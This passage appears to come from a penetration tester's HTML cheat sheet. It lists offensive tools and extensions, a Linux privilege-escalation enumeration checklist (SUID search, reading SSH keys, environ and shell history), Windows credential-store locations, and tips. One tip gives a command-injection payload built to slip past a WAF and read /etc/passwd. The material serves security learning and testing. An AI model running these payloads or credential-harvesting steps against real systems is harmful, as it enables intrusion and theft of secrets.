        <li><a href='#n4.1'>GitHub Tools</a>
	<li><a href='#n4.2'>Browsers extensions</a>. Note: Chrome extensions also work with <a href='https://brave.com/download/'>Brave Browser</a>
	<li><a href='#n4.3'>Burp Suite Extensions</a>
	<li><a href='#n4.4'>Kali Tools</a>
	<li><a href='#n4.5'>Platforms for hacking and pentesting</a>
	<li><a href='#n4.6'>Another tools</a></li>
</ol>
	<h3 id='n4.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>GitHub Tools</ins></h3>
		My GitHub <a href='https://github.com/Kode-n-Rolla?tab=stars'>stars</a> where I categorized github tools.
		<p> 👇Some of the most awesome tools (IHMO)👇
		<ol>
			<li><a href='#n4.1.1'>BruteForce & Wordlists </a>
			<li><a href='#n4.1.2'>Enumiration </a>
			<li><a href='#n4.1.3'>OSINT </a>
			<li><a href='#n4.1.4'>Payloads </a>
			<li><a href='#n4.1.5'>Privilege Escalation </a>
			<li><a href='#n4.1.6'>Social Engineering </a>
			<li><a href='#n4.1.7'>Looking for exploits and vulnerabilities </a>
			<li><a href='#n4.1.8'>Another </a>
		</ol>
			<ol>
				<li><h3 id='n4.1.1'>BruteForce and Wordlists</h3>
					<ul>
						<li><a href='https://github.com/Cryilllic/Active-Directory-Wordlists'> Active Directory </a> Wordlists contains User.txt and Pass.txt
						<li><a href='https://github.com/duyet/bruteforce-database'> BruteForce </a> Database
						<li><a href='https://github.com/empty-jack/YAWR'> YAWR</a>. Yet Another Wordlists Repo. Contains OS,RECON,WEB,brute folders
						<li><a href='https://www.kali.org/tools/crunch/'> Crunch </a>
				   			<p> This is one of many powerful tools for creating an offline wordlist. With crunch, you can specify numerous options, including min, max, and options. The following example creates a wordlist containing all 								possible combinations of 3 characters, including 1-5 and qwerty. You can use the -o argument to save. <p>Example: <pre><code> crunch 3 3 12345qwerty -o cranch.txt </code></pre>
						<li> Top wordlists by <a href='https://github.com/danielmiessler/SecLists'> DanielMiessler </a>
						<li><a href='https://github.com/blark/aiodnsbrute'> DNS </a> asynchronous bruteforce
		 				<li><a href='https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master'> Tool </a> for hash identification. 
							<p> Python file. Powerful. User friendly interface.
						<li><a href='https://github.com/ropnop/kerbrute'> Kerberos </a> bruteforcing
						<li><a href='https://github.com/therodri2/username_generator'> Username generator </a>
							<p> Could help create a list with most of the possible combinations if we have a first name and last name. Use git clone and 
							<p> <pre><code> python3 username_generator.py -h </code></pre> shows the tool's help message and optional arguments.
						<li><a href='https://github.com/kkrypt0nn/wordlists'> Wordlists </a> by kkrypt0nn. A collection of wordlists for many different usages
		    			</ul>
				<li><h3 id='n4.1.2'> Enumiration </h3>
					<ul>
						<li><a href='https://github.com/h4r5h1t/webcopilot'>WebCopilot</a> is an automation tool designed to enumerate subdomains of the target and detect bugs using different open-source tools
						<li><a href='https://github.com/ly4k/Certipy'>Certipy</a>. Tool for Active Directory Certificate Services enumeration and abuse
						<li><a href='https://github.com/ffuf/ffuf'>Fuzzer </a>
						<li><a href='https://github.com/fuzzdb-project/fuzzdb'>fuzzdb </a>
						<li><a href='https://github.com/guelfoweb/knock'>Knock.py</a> - subdomain scanner
						<li><a href='https://github.com/diego-treitos/linux-smart-enumeration'>Linux</a> smart enumiration
						<li><a href='https://github.com/aboul3la/Sublist3r'>Sublist3r</a>. Subdomains enumiration python tool
					</ul>
				<li><h3 id='n4.1.3'> OSINT </h3>
					<ul>
						<li><a href='https://github.com/IvanGlinkin/Fast-Google-Dorks-Scan'> Fast Google Dorks Scan </a>
						<li><a href='https://github.com/khast3x/h8mail'> h8mail </a> is an email OSINT and breach hunting tool
						<li><a href='https://github.com/laramies/theHarvester'> theHarvester</a>. E-mails, subdomains and names Harvester 
					</ul>
				<li><h3 id='n4.1.4'> Payloads </h3>
					<ul>
						<li><a href='https://github.com/swisskyrepo/PayloadsAllTheThings'> All </a> kind of payloads and bypasses
						<li><a href='https://github.com/payloadbox/command-injection-payload-list'> Payloads </a> for Unix and Windows OS
						<li><a href='https://github.com/capture0x/XSS-LOADER'> XSS-LOADER</a>. All in one tools for XSS PAYLOAD GENERATOR -XSS SCANNER-XSS DORK FINDER
						<li><a href='https://github.com/payloadbox/xss-payload-list'> XSS </a> payloads
		  			 </ul>
				<li><h3 id='n4.1.5'> Privilege Escalation </h3>
					<ul>
						<li><a href='https://github.com/carlospolop/PEASS-ng'> Privilege Escalation </a> (LinPEAS & WinPEAS)
						<li><a href='https://github.com/luke-goddard/enumy'> Enumy</a>. Linux post exploitation privilege escalation enumeration
						<li><a href='https://github.com/linted/linuxprivchecker'> Linux </a> PrivEsc Check Script
						<li><a href='https://github.com/The-Z-Labs/linux-exploit-suggester'> Linux PrivEsc </a>
						<li><a href='https://github.com/gentilkiwi/mimikatz'> Mimikatz</a>. Windows PrivEsc
						<li><a href='https://github.com/mostaphabahadou/postenum'> Postenum </a> is a Linux enumeration and privilege escalation tool
						<li><a href='https://github.com/antonioCoco/RogueWinRM'> RougeWinRM</a>. Win PrivEsc
					</ul>
				<li><h3 id='n4.1.6'> Social Engineering </h3>
					<ul>
						<li><a href='https://github.com/giuliacassara/awesome-social-engineering'> Awesome </a> social engineering resources
						<li><a href='https://github.com/trustedsec/social-engineer-toolkit'> SET</a>. Social Engineer Toolkit
		    			</ul>
		   		<li><h3 id='n4.1.7'> Looking for exploits and vulnerabilities </h3>
					<ul>
						<li><a href='https://gitlab.com/kalilinux/packages/exploitdb'> Searchsploit</a> - provides direct access to the Exploit Database from the Kali Linux terminal. Users can utilize powerful search commands to quickly discover exploits and vulnerabilities. This tool is an indispensable assistant for security professionals working in the Kali Linux environment
						<li><a href='https://github.com/vulnersCom/getsploit'> getsploit</a> - combines the functionality of searchsploit with the ability to download exploits. It allows users to conduct online searches across databases such as Exploit-DB, Metasploit, and Packetstorm. Additionally, it provides the capability to download exploit source code directly, making the search and retrieval of necessary data for pentesting simple and effective
						<li><a href='https://github.com/projectdiscovery/cvemap'> CVEMap</a> - a tool from Projectdiscovery designed for quick and convenient searching across all known vulnerability databases
						<li><a href='https://github.com/rfunix/Pompem'> Pompem</a> - a tool pre-installed in Parrot OS, automates the process of searching for exploits and vulnerabilities. It uses an advanced search system to check databases such as PacketStorm Security, CXSecurity, ZeroDay, Vulners, and NVD
						<li><a href='https://github.com/justakazh/sicat'> SiCat</a> - stands out for its comprehensive approach to exploit searching. It adeptly extracts information about exploits from open sources and local repositories
					</ul>
				<li><h3 id='n4.1.8'> Another </h3>
					<ul>
						<li><a href='https://github.com/wapiti-scanner/wapiti'> Wapiti</a>. Web vulnerability scanner
						<li><a href='https://github.com/Bearer/bearer'> Bearer</a>. Scans source code against top security and privacy risks
						<li><a href='https://github.com/Porchetta-Industries/CrackMapExec'> CrackMapExec</a>. A swiss army knife for pentesting networks
						<li><a href='https://github.com/BloodHoundAD/BloodHound'> BloodHound</a>. Six Degrees of Domain Admin
						<li><a href='https://github.com/digininja/CeWL'> Cewl </a> can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. 							Consider the following example below:
							<pre><code> cewl -w list.txt -d 5 -m 5 http://target_site.com </code></pre>
							<p> -w will write the contents to a file, here is list.txt.
							<p> -m 5 gathers strings (words) that are 5 characters or more
							<p> -d 5 is the depth level of web crawling/spidering (default 2)
							<p> http://target_site.com is the URL that will be used
							<p> As a result, now have a decently sized wordlist based on relevant words for the specific enterprise, like names, locations, and a lot of their business lingo. Similarly, the wordlist that was created could be 								used to fuzz for usernames. 
						<li><a href='https://www.kali.org/tools/ncurses-hexedit/'> Hexeditor </a>
			        			<p> Tools for change files signature. <a href='https://en.wikipedia.org/wiki/List_of_file_signatures'> Link </a> to Wiki with List of file signatures. 
						<li><a href='https://github.com/CISOfy/lynis'> Lynis</a>. Check Linux security
						<li><a href='https://github.com/DominicBreuker/pspy'> Pspy</a>. Great for enumeration of Linux systems in CTFs and more.
						<li><a href='https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master'> Hash Identifier </a>. Python file. Powerful. User friendly interface.
					</ul>
				</ol>		
			 <h3 id='n4.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Browser extensions</ins></h3>
				<ul>
					<li><a href='https://www.wappalyzer.com/'>Wappalyzer</a> (<a href='https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en'>Chrome</a>) - Defines CMS, JS-libraries, frameworks and another technologies used on the site</li>
					<li>Foxy Proxy (<a href='https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp?hl=en'>Chrome</a>) - Fast change proxy, for example, use with Burp Suite</li>
					<li>Rested (<a href='https://addons.mozilla.org/en-US/firefox/addon/rested/'>FireFox</a>) - Quick request sender. Usefull with API</li>
					<li>Alratir (<a href='https://addons.mozilla.org/en-US/firefox/search/?q=altair'>FireFox</a> | <a href='https://chromewebstore.google.com/detail/altair-graphql-client/flnheeellpciglgpaodhkhmapeljopja?hl=en'>Chrome</a>) - help with GraphQL requests</li>
					<li>HackTools (<a href='https://addons.mozilla.org/en-US/firefox/addon/hacktools/'>FireFox</a> | <a href='https://chromewebstore.google.com/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi'>Chrome</a>) - is a web extension facilitating your web application penetration tests, it includes cheat sheets as well as all the tools used during a test such as XSS payloads, Reverse shells to test your web application</li>
					<li>Cookie Editor (<a href='https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm?hl=en'>Chrome</a>) - Allows you to change, delete, add cookie values for various testing purposes. Can be tested for access control errors, privilege escalation, etc</li>
					<li>Hackbar (<a href='https://addons.mozilla.org/en-US/firefox/addon/maxs-hackbar/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc?hl=en'>Chrome</a>) - Contains payloads for XSS attacks, SQL injections, WAF bypass, LFI, etc</li>
					<li>ModHeader (<a href='https://addons.mozilla.org/en-US/firefox/addon/modheader-firefox/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/modheader-modify-http-hea/idgpnmonknjnojddfkpgkljpfnnfcklj?hl=en'>Chrome</a>) - Helps to easily change HTTP request and response headers in the browser</li>
					<li>User-Agent Switcher (<a href='https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg'>Chrome</a>)</li>
					<li>Wayback Machine (<a href='https://addons.mozilla.org/en-US/firefox/addon/wayback-machine_new/'>FireFox</a> | <a href='https://chromewebstore.google.com/detail/wayback-machine/fpnmgdkabkmnadcjpehmlllkndpkmiak'>Chrome</a>) - Official Internet Archive Wayback Machine Browser Extension. Non official for <a href='https://addons.mozilla.org/en-US/firefox/addon/waybackurl/'>FireFox</a></li>
					<li><a href='https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/'>Firefox Multi-Account Containers</a>. Lets you keep parts of your online life separated into color-coded tabs.
					<li>Beautifer & Minify (<a href='https://addons.mozilla.org/en-US/firefox/addon/beautifer-minify/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/beautifer-minify/ahhjkfcneijonkihlcplndcnlpofjaip?hl=en'>Chrome</a>) - Brings readable CSS, HTML and JavaScript code</li>
					<li>BuiltWith (<a href='https://addons.mozilla.org/en-US/firefox/addon/builtwith/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/builtwith-technology-prof/dapjbgnjinbpoindlpdmhochffioedbn?hl=en'>Chrome</a>) - Get web app technologies</li>
					<li>DotGit (<a href='https://addons.mozilla.org/en-US/firefox/addon/dotgit/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/dotgit/pampamgoihgcedonnphgehgondkhikel?hl=en'>Chrome</a>) - An extension to check for the presence of .git on websites you visit. Also checks open .env files, security.txt and more</li>
					<li>Email Extractor (<a href='https://addons.mozilla.org/en-US/firefox/addon/mailshunt-email-extractor/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/email-extractor/jdianbbpnakhcmfkcckaboohfgnngfcc?hl=en'>Chrome</a>) - Automatically saves email addresses from the web pages visit. Helps with social engineering attacks, brute force attacks, etc</li>
					<li>Exif-Viewer (<a href='https://addons.mozilla.org/en-US/firefox/addon/exif-viewer/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/exif-viewer-pro/mmbhfeiddhndihdjeganjggkmjapkffm'>Chrome</a>) - Help to check photo metadata</li>
					<li>Fake Filler (<a href='https://addons.mozilla.org/en-US/firefox/addon/fake-filler/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/fake-filler/bnjjngeaknajbdcgpfkgnonkmififhfo?hl=en'>Chrome</a>) - Simplifies and speeds up testing of fillable forms by developers and testers. Helps to populate all input forms (text fields, areas, dropdowns, etc.) with fake and randomly generated data</li>
					<li>Knoxss (<a href='https://addons.mozilla.org/en-US/firefox/addon/knoxss-community-edition/'>FireFox</a>) - Finds XSS vulnerabilities. Community Edition and Pro Version</li>
					<li>Nimbus Screenshot (<a href='https://addons.mozilla.org/en-US/firefox/addon/nimbus-screenshot/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/nimbus-screenshot-screen/bpconcjcammlapcogcnnelfmaeghhagj'>Chrome</a>) - To make screenshot</li>
					<li>Privicy Badger (<a href='https://addons.mozilla.org/en-US/firefox/addon/privacy-badger17/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/privacy-badger/pkehgijcmpdhfbdbbnkijodmdjhbjlgp?hl=en'>Chrome</a>) - utomatically learns to block invisible trackers</li>
					<li>Temp Mail (<a href='https://addons.mozilla.org/en-US/firefox/addon/temp-mail/'>FireFox</a>) - Temporary disposable email address. Protect your email from spam, bots and phishing with Temp-Mail</li>
					<li>Retire.js (<a href='https://addons.mozilla.org/en-US/firefox/addon/retire-js/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom?hl=en'>Chrome</a>) - Displays the resence of vulnerable JavaScript libraries. This helps to find known vulnerabilities in JS and some CVEs affecting sites with vulnerable JS libraries</li>
					<li>Shodan (<a href='https://addons.mozilla.org/en-US/firefox/addon/shodan-addon/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap'>Chrome</a>) - The Shodan plugin tells you where the website is hosted (country, city), who owns the IP and what other services/ ports are open</li>
					<li>Ublock Origin (<a href='https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en'>Chrome</a>) - An efficient wide-spectrum content blocker</li>
					<li>Chaff (<a href='https://chrome.google.com/webstore/detail/chaff/jgjhamliocfhehbocekgcddfjpgdjnje'>Chrome</a>) - Generate fake traffic</li>
					<li>TruffleHog Chrome Extension (<a href='https://addons.mozilla.org/en-US/firefox/addon/trufflehog/'>FireFox</a> | <a href='https://chrome.google.com/webstore/detail/trufflehog/bafhdnhjnlcdbjcdcnafhdcphhnfnhjc'>Chrome</a>) - Scans the websites you visit looking for API keys and credentials and notifies you if they are found</li>
					<li>OWASP Penetration Testing Kit (<a href='https://addons.mozilla.org/en-US/firefox/addon/penetration-testing-kit/'>FireFox</a> | <a href='https://chromewebstore.google.com/detail/owasp-penetration-testing/ojkchikaholjmcnefhjlbohackpeeknd'>Chrome</a>) - help with checks for commin bug</li>
					<li>Vulners Web Scanner (<a href='https://addons.mozilla.org/en-US/firefox/addon/vulners-web-scanner/'>FireFox</a> | <a href='https://chromewebstore.google.com/detail/vulners-web-scanner/dgdelbjijbkahooafjfnonijppnffhmd'>Chrome</a>) - Tiny and passive vulnerability scanner based on vulners.com vulnerability database</li>
					<li>Web Developer (<a href='https://addons.mozilla.org/en-US/firefox/addon/web-developer/'>FireFox</a> | <a href='https://chromewebstore.google.com/detail/web-developer/bfbameneiokkgbdmiekhjnmfkcnldhhm'>Chrome</a>) - Adds a toolbar button with various web developer tools</li>
					<li>Panic Button (<a href='https://addons.mozilla.org/en-US/firefox/addon/panic-button/'>FireFox</a> | <a href='https://chromewebstore.google.com/detail/panic-button/mglkbkfblclhiapcciclfblcncdabdhe'>Chrome</a>) - Quickly hide all browser windows with a click of a button</li>
				</ul>
			<h3 id='n4.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Burp Suite Extensions</ins></h3>
					<ul>
						<li><a href='https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f'>Autorize</a> help to detect authorization vulnerabilities</li>
						<li><a href='https://portswigger.net/bappstore/470b7057b86f41c396a97903377f3d81'>Logger++</a> allows advanced filters to be defined to highlight interesting entries or filter logs to only those which match the filter</li>
						<li><a href='https://portswigger.net/bappstore/4826bfa0c67d41a8b518139186693131'>PyCrypt</a> enables users to encrypt and decrypt requests and response for manual and automated application penetration testing</li>
						<li><a href='https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd'>JWT Editor</a>. Is a extension or editing, signing, verifying, encrypting and decrypting JSON Web Tokens (JWTs)</li>
						<li><a href='https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb'>Software Vulnerability Scanner</a> - This extension displays public vulnerabilities for applications detected in the traffic proxied by 							Burp. Essentially, it acts as a layer between Burp and the API of this excellent vulnerability aggregator</li>
						<li><a href='https://portswigger.net/bappstore/9cff8c55432a45808432e26dbb2b41d8'>Backslash Powered Scanner</a> - Enhances Burp's active scanner using a novel approach capable of finding and confirming both known and 							unknown classes of server-side injection vulnerabilities</li>
						<li><a href='https://portswigger.net/bappstore/866df66d339d4bcd9b599772aff32efd'>CSTC, Modular HTTP Manipulator</a> - CyberChef integrated in BurpSuite with live modification of requests at your fingertips</li>
						<li><a href='https://portswigger.net/bappstore/f154175126a04bfe8edc6056f340f52e'>SQLiPy</a> - A tool that integrates Burp Suite with SQLMap using the SQLMap API to check for SQL injection vulnerabilities</li>
						<li><a href='https://portswigger.net/bappstore/3123d5b5f25c4128894d97ea1acc4976'>Active Scan++</a> - Expands the range of checks performed by the active and passive scanners. It identifies vulnerabilities such as 	cache poisoning, DNS rebinding, various injections, and also performs additional checks to detect XXE injections and more</li>
						<li><a href='https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988'>Turbo Intruder</a> - A faster alternative to Intruder equipped with a scriptable engine for sending a large number of HTTP requests and 							analyzing the results. Useful when speed is required</li>
						<li><a href='https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c'>Bypass WAF</a> - A tool for bypassing web application firewalls (WAFs)</li>
						<li><a href='https://portswigger.net/bappstore/0e61c786db0c4ac787a08c4516d52ccf'>BurpJS Link Finder</a> - Helps identify and discover links based on JavaScript in web applications</li>
						<li><a href='https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122'>403 Bypasser Extension</a> - A tool designed to bypass 403 errors commonly encountered when attempting to access restricted areas of a website</li>
						<li><a href='https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f'>InQL</a> to assist in your GraphQL security testing efforts</li>
						<li><a href='https://portswigger.net/bappstore/9cff8c55432a45808432e26dbb2b41d8'>Backslash Powered Scanner</a>. This extension complements Burp's active scanner by using a novel approach capable of finding and confirming both known and unknown classes of server-side injection vulnerabilities</li>
						<li><a href='https://github.com/portswigger/hackvertor'>Hackvertor</a> is a tag-based conversion tool that supports various escapes and encodings including HTML5 entities, hex, octal, unicode, url encoding etc</li>
						<li><a href='https://portswigger.net/bappstore/6bf7574b632847faaaa4eb5e42f1757c'>OpenAPI Parser</a>. Extension streamlines the process of assessing web services that use OpenAPI-based APIs</li>
						<li><a href='https://portswigger.net/bappstore/0e61c786db0c4ac787a08c4516d52ccf'>JS Link Finder</a>. Extension for a passively scanning JavaScript files for endpoint links. - Export results the text file - Exclude 	specific 'js' files e.g. jquery, google-analytics (Professional)</li>
						<li><a href='https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278'>Content Type Converter</a>. This extension converts data submitted within requests between various common formats:</li>
							<ul>
								<li>JSON To XML
								<li>XML to JSON
								<li>Body parameters to JSON
								<li>Body parameters to XML
							</ul>
						<li><a href='https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943'>Param miner</a>. Extension identifies hidden, unlinked parameters. It's particularly useful for finding web cache poisoning vulnerabilities</li>
						<li><a href='https://portswigger.net/bappstore/af490ae7e79546fa81a28d8d0b90874e'>Pentest Mapper</a>. Is a extension that integrates the Burp Suite request logging with a custom application testing checklist</li>
						<li><a href='https://portswigger.net/bappstore/e4e0f6c4f0274754917dcb5f4937bb9e'>Piper</a> makes integrating external tools into Burp easier</li>
						<li><a href='https://portswigger.net/bappstore/815bb4ab64e240618dc673d65016e919'>GAP</a>. Extension helps find potential endpoints, parameters, and generate a custom target wordlist.</li>
						<li><a href='https://portswigger.net/bappstore/b4915681326648b1a12e4059d71bc909'>Agartha</a>, specializes in advance payload generation and access control assessment</li>
					</ul>
     			<h3 id='n4.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Kali Tools</ins></h3>
				 <ol>
					<li><a href='https://www.kali.org/tools/name-that-hash/'>Name That Hash</a> - Instantly name the type of any hash (with hashcat command)</li>
						<pre><code>name-that-hash --help</code></pre>
					<li><a href='https://www.kali.org/tools/wafw00f/'>wafw00f</a> - This package identifies and fingerprints Web Application Firewall (WAF) products</li>
						<pre><code>wafw00f -h</code></pre>
					<li><a href='https://www.kali.org/tools/gowitness/'>gowitness</a> is a website screenshot utility, that uses Chrome Headless to generate screenshots of web interfaces using the command line</li>
					<li><a href='https://github.com/commixproject/commix'>Commix</a> is an open source penetration testing tool for command injections</li>
 				</ol>
			<h3 id='n4.5'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ins>Platforms for hacking and pentesting</ins></h3>
   				<ul>
					<li><a href='https://pentest-tools.com/'>Pentest-Tools</a></li>
					<li><a href='https://hackertarget.com/'>HackerTarget</a></li>
				</ul>
    			<h3 id='n4.6'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ins>Another tools</ins></h3>
       				<ul>
					<li><a href='https://flameshot.org/'>Flameshot</a>. Make screenshots with some additional functions like highlighting. <code>apt install flameshot</code></li>
				</ul>

   
<h3 align='right'><a href='#start'> <-- Back </a></h3>

<h2 align='center' id='n5'><em> Privilege Escalation </em></h2>
<h3> ENUMERATION is a key! </h3>
	<ul>
		<li><a href='#n5.1'>Linux</a>
	 	<li><a href='#n5.2'>Windows</a>
	</ul>
		 <h3 id='n5.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Linux</ins> </h3>
	  		Some advice to Linux Privilege Escalation
	    		<ol>
				<li>Check out user are running - <code>whoami</code></li>
				<li>Check out groups does running user belong to - <code>id</code></li>
				<li>Check out what is the server named - <code>hostname</code></li>
				<li>Check out what subnet did land in - <code>ifconfig</code> or <code>ip -a</code></li>
				<li>Check out kernel ( <code>uname -a</code> ) and OS version ( <code>cat /etc/os-release</code> )</li>
				<li>Check out screen version - <code> screen -v</code></li>
				<li>Check out .ssh folder in <code>/home/&lt;USERNAME>/.ssh</code> or <code>/root/.ssh</code></li>
				<li>Check out all environment variables <code> env </code></li>
				<li>Check out login shells exist on the server - <code> cat /etc/shells </code> </li>
				<li>Check out Cron Tab:</li>
					<p><code>ls -la /etc/cron.d</code>
					<p><code>ls -la /etc/init.d</code>
				<li>Check out setuid and setgid</li>
					<p> To find files with sticky bit:
						<pre><code>find / -perm -u=s -type f 2>/dev/null</code></pre>
						<pre><code>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null</code></pre>
      						<pre><code>find / -perm -4000 2>/dev/null</code></pre>
					<p> To check out rights
					<p> <pre><code>ls -la</code></pre>
				<li>Find world writable files for every users - <code> find / -perm -2 -type f 2>/dev/null </code></li>
				<li>Check out NOPASSWD sudo command - <code> sudo -l</code></li>
				<li>Check out PATH - <code>echo $PATH</code></li>
				<li>Check out the routing table by <code> route </code> or <code> netstat -rn </code></li>
				<li>Check out arp table - <code> arp -a </code></li>
				<li>Check out environ:</li>
					<p><pre><code> cat /proc/self/environ </code></pre>
				<li>Check out history:</li>
					<p><code>history</code>
					<p><code>cat ~/.bash_history</code>
					<p><code>cat ~/.mysql_history</code>
					<p><code>cat ~/.nano_history</code>
					<p><code>cat ~/.php_history</code>
					<p><code>cat ~/.atftp_history</code>
					<p><code>cat ~/.*history | less</code> - all history search
				<li>Check out executable files in:</li>
					<p><code> home directory </code> and <code> /var/www </code> or the same
				<li>Check out some additional information about the host itself such as the CPU type/version - <code> lscpu </code></li>
				<li>Check out logrotate version - <code> logrotate --version</code>. This <a href='https://github.com/whotwagner/logrotten'> github tool</a> can help with privesc</li>
				<li>Look at:</li>
					<ul>
						<li>Open ports</li>
						<li>.bat and .bak files</li>
						<li>Interesting permissions</li>
					</ul>
				<li>And check <a href='https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/'>this</a> and <a href='https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation'>this</a> links for more help</li>
	    		</ol>
	    <h3 id='n5.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Windows</ins> </h3>
			<ol>
				<li><code>systeminfo</code> - information about the target system
				<li><code>cmdkey /list</code> - list any saved credentials\
			</ol>

       
      
<h3 align='right'><a href='#start'> <-- Back </a></h3> 


<!-- <h2 align='center' id='n7'><em> AWS </em></h2>


<h3 align='right'><a href='#start'> <-- Back </a></h3> -->


<h2 align='center' id='n6'><em>Tips</em></h2>
<ol>
	<li>If you have JSON in request, try to change JSON to XML</li>
	<li>Command Injection</li>
		&nbsp;&nbsp;<p> If you find Command Injection and the WAF blocks keywords, you can attempt a bypass method by adding a backslash and a newline character between the blacklisted words.
			<pre><code>c\%0aat /et\%0ac/pas\%0aswd</code></pre>
	<li>If target use svg files, try to upload svg with XSS or XML payload</li>
	<li>Interesting file location:</li>
		<p>Windows hashes
		<ul>Local computer:
			<li> File: \%systemroot%\system32\config\SAM</li>
			<li> Registry: HKEY_LOCAL_MACHINE\SAM</li>
			<li> File: \%systemroot%\system32\confog\SECURITY</li>
			<li> Registry: HKEY_LOCAL_MACHINE\SECURITY\SAM</li>
		</ul> <p>
		<ul>Active Directory:
			<li>%systemroot%\ntds\ntds.dit</li>
		</ul>
	<li>Identifying Algorithm from the first hash blocks:</li>
		<ul>
			<li> Salted MD5	- <code> $1$... </code></li>
			<li> SHA-256	- <code> $5$... </code></li>
			<li> SHA-512	- <code> $6$... </code></li>
			<li> BCrypt	- <code> $2a$... </code></li>
			<li> Scrypt	- <code> $7$... </code></li>
			<li> Argon2	- <code> $argon2i$... </code></li>
   		</ul>
	<li> Headers:
		<ul>
			<li> X-Forwarded-For. (XFF) header is an HTTP header used to identify the original IP address of a client connecting to a web server through an HTTP proxy or load balancer. By including this header, the server can log and track the original 				client's IP address instead of the proxy or load balancer's IP.</li>
		</ul>
	<li> Virtual Box:
		<ul>
			<li> How to enable Nested VT-x in Windows:</li>
				<pre><code>cd C:\Program Files\Oracle\VirtualBox</code></pre>
				<pre><code>VBoxManage.exe list vms</code></pre>
				<pre><code>VBoxManage.exe modifyvm &lt;"NAME_OF_MACHINE"> --nested-hw-virt on</code></pre>
		</ul>
	<li>Configuration files:
		<ul>
			<li> /.htaccess</li>
			<li> /.htpasswd</li>
			<li> /web.config</li>
			<li> /.git/config</li>
			<li> /nginx.conf</li>
			<li> /server-status</li>
			<li> /status</li>
			<li> /cgi-bin/php.ini</li>
   		</ul>
	<li>Secure your machine!
		<ul>
			<li> <a href='https://reqrypt.org/tallow.html'>Tallow</a>. All traffic throw tor</li>
			<li> <a href='https://safing.io/'>Safing Portmaster</a>. Your firewall</li>
		</ul>
	<li> <a href='https://0xacab.org/jvoisin/mat2'>mat2</a>. Tool gets rid of metadata everywhere
		<li>Unified Kill Chain</li>
			<p>1. Reconnaissance (<a href='https://attack.mitre.org/tactics/TA0043/'>MITRE Tactic TA0043</a>)
			<p>2. Weaponization (<a href='https://attack.mitre.org/tactics/TA0001/'>MITRE Tactic TA0001</a>)
			<p>3. Social Engineering (<a href='https://attack.mitre.org/tactics/TA0001/'>MITRE Tactic TA0001</a>)
			<p>4. Exploitation (<a href='https://attack.mitre.org/tactics/TA0002/'>MITRE Tactic TA0002</a>)
			<p>5. Persistence (<a href='https://attack.mitre.org/tactics/TA0003/'>MITRE Tactic TA0003</a>)
	  		<p>6. Defence Evasion (<a href='https://attack.mitre.org/tactics/TA0005/'>MITRE Tactic TA0005</a>)
			<p>7. Command & Control (<a href='https://attack.mitre.org/tactics/TA0011/'>MITRE Tactic TA0011</a>)
			<p>8. Pivoting (<a href='https://attack.mitre.org/tactics/TA0008/'>MITRE Tactic TA0008)/a>)
	<li>Jenkins endpoints.</li>
		<ul>
			<li>•  /signup
			<li>•  /jenkins/signup
		</ul>
	<li>403 Bypass</li>
		<ul>
			<li>Try to change method to PATCH and add header <code>Accept: application/json</code></li>
		</ul>
	<li>Default servers` distanation path</li>
		<ul>
			<li>Apache and NGINX - <code> /var/www/html</code></li>
